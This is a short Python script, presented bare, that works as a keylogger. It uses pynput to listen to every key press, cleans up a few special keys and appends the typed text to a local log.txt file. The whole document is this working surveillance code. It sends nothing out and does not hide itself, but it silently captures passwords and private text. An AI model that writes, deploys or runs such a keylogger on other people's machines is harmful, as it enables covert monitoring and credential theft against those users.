from pynput.keyboard import Listener

def keyboardcon(key):
    keydata = str(key)
    keydata = keydata.replace("'","")

    if keydata == "Key.shift_r":
        keydata = ""

    if keydata == "Key.ctrl_l":
        keydata = ""

    if keydata == "Key.enter":
        keydata = "\n"

    if keydata == "Key.space":
        keydata = " "


    with open("log.txt","a") as w:
        w.write(keydata)

with Listener(on_press=keyboardcon) as l:
    l.join()